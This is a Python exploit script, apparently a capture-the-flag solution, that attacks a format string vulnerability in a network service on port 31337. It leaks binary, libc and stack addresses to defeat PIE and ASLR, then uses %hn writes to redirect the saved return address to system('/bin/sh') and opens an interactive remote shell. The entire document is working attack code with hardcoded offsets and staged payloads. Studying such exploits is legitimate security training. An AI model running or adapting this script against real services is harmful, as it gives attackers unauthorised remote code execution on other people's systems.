from struct import pack, unpack
from telnetlib import Telnet
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = ("localhost", 31337)  # Replace localhost with IP of target.
libc_found = True  # Change between True and False depending on if libc version is found. If libc version is found, add printf, system, and /bin/sh offsets to offset variables below.
def p32(x): return pack("<I", x)
def u32(x): return unpack("<I", x)[0]  # Used to pack and unpack addresses for sending and receiving addresses.

bin_offset = 0x637
putsgot_offset = 0x1fd8
fflushgot_offset = 0x1fd0
fgetsgot_offset = 0x1fd4
printfgot_offset = 0x1fcc
printflibc_offset = 0x512d0
systemlibc_offset = 0x3d200
binshlibc_offset = 0x17e0cf

def find_bin_base(bin_offset):  # Finds the base address of the program in memory (to bypass PIE).
    s.send("%3$x" + '\n')
    bin_leak = int(s.recv(1024)[:-1], 16)
    print("[\033[92m+\033[0m] Leaked address: " + hex(bin_leak))
    bin_base = bin_leak - bin_offset
    print("[\033[92m+\033[0m] Binary base address: " + hex(bin_base))
    return bin_base

def calc_got(*argv):  # Calculates the GOT addresses of different libc functions.
    printfgot_addr = bin_base + printfgot_offset
    print("[\033[92m+\033[0m] printf@got address: " + hex(printfgot_addr))
    if len(argv) == 2:
        return printfgot_addr
    putsgot_addr = bin_base + putsgot_offset
    print("[\033[92m+\033[0m] puts@got address: " + hex(putsgot_addr))
    fflushgot_addr = bin_base + fflushgot_offset
    print("[\033[92m+\033[0m] fflush@got address: " + hex(fflushgot_addr))
    fgetsgot_addr = bin_base + fgetsgot_offset
    print("[\033[92m+\033[0m] fgets@got address: " + hex(fgetsgot_addr))
    return putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr

def leak_libc(*argv):  # Leaks the libc addresses of different functions.
    payload = p32(printfgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    printf = s.recv(1024)
    printf = u32(printf[4:8])
    print("[\033[92m+\033[0m] printf@libc address: " + hex(printf))
    if len(argv) == 1:
        return printf
    payload = p32(putsgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    puts = s.recv(1024)
    puts = u32(puts[4:8])
    print("[\033[92m+\033[0m] puts@libc address: " + hex(puts))
    payload = p32(fflushgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    fflush = s.recv(1024)
    fflush = u32(fflush[4:8])
    print("[\033[92m+\033[0m] fflush@libc address: " + hex(fflush))
    payload = p32(fgetsgot_addr)
    payload += b"%7$s"
    s.send(payload + '\n')
    fgets = s.recv(1024)
    fgets = u32(fgets[4:8])
    print("[\033[92m+\033[0m] fgets@libc address: " + hex(fgets))

def calc_libc(printf, printflibc_offset):  # Calculates the libc addresses of the system function and the '/bin/sh' string.
    libc_base = printf - printflibc_offset
    print("[\033[92m+\033[0m] libc base address: " + hex(libc_base))
    system = libc_base + systemlibc_offset
    print("[\033[92m+\033[0m] system address: " + hex(system))
    binsh = libc_base + binshlibc_offset
    print("[\033[92m+\033[0m] binsh address: " + hex(binsh))
    return system, binsh

def leak_stack():  # Leaks the stack addresses that we need to overwrite.
    s.send("%72$x" + '\n')
    stack_leak = int(s.recv(1024)[:-1], 16)
    print("[\033[92m+\033[0m] Leaked stack address: " + hex(stack_leak))
    eip_addr = stack_leak - 0x4
    print("[\033[92m+\033[0m] EIP address: " + hex(eip_addr))
    arg_addr = stack_leak + 0x4
    print("[\033[92m+\033[0m] Argument address: " + hex(arg_addr))
    return eip_addr, arg_addr

def address_format(address):  # Calculates the number of bytes that need to be written to write the addresses.
    firsthalfhex = hex(address)[6:]
    firsthalf = int("0x" + firsthalfhex, 0)
    firsthalf -= 8
    if len(str(firsthalf)) == 4:
        firsthalf = "0" + str(firsthalf)
    secondhalfhex = hex(address)[:6]
    firsthalfhex = int("0x" + firsthalfhex, 16)
    secondhalf = int(secondhalfhex, 16) - firsthalfhex
    if len(str(secondhalf)) == 4:
        secondhalf = "0" + str(secondhalf)
    return (firsthalf, secondhalf)

def write_address(function, address):  # Writes a value to an address.
    firsthalf, secondhalf = address_format(function)
    payload = p32(address)
    payload += p32(address + 2)
    payload += b"%" + str.encode(str(firsthalf)) + b"x%7$hn"
    payload += b"%" + str.encode(str(secondhalf)) + b"x%8$hn"
    s.send(payload + '\n')

s.connect(target)
s.recv(1024)
if libc_found:  # Finds necessary addresses, executes a shell, and interacts with the service.
    print("[\033[94m*\033[0m] Stage 1: Finding printf GOT address")
    bin_base = find_bin_base(bin_offset)
    printfgot_addr = calc_got(bin_base, printfgot_offset)
    print("[\033[94m*\033[0m] Stage 2: Leaking libc addresses")
    printf = leak_libc(printfgot_addr)
    system, binsh = calc_libc(printf, printflibc_offset)
    print("[\033[94m*\033[0m] Stage 3: Leaking stack addresses")
    eip_addr, arg_addr = leak_stack()
    print("[\033[94m*\033[0m] Stage 4: Writing addresses")
    write_address(system, eip_addr)
    write_address(binsh, arg_addr)
    s.send(" " * 256 + '\n')
    print("[\033[94m*\033[0m] Attempting interactive shell")
    t = Telnet()
    t.sock = s
    t.interact()
else:  # Only leaks libc addresses so libc version can be found manually.
    print("[\033[94m*\033[0m] Stage 1: Finding GOT addresses")
    bin_base = find_bin_base(bin_offset)
    putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr = calc_got(bin_base, putsgot_offset, fflushgot_offset, fgetsgot_offset, printfgot_offset)
    print("[\033[94m*\033[0m] Stage 2: Leaking libc addresses")
    leak_libc(putsgot_addr, fflushgot_addr, fgetsgot_addr, printfgot_addr)
    print("[\033[94m*\033[0m] Using these values, find the libc version at libc.blukat.me")
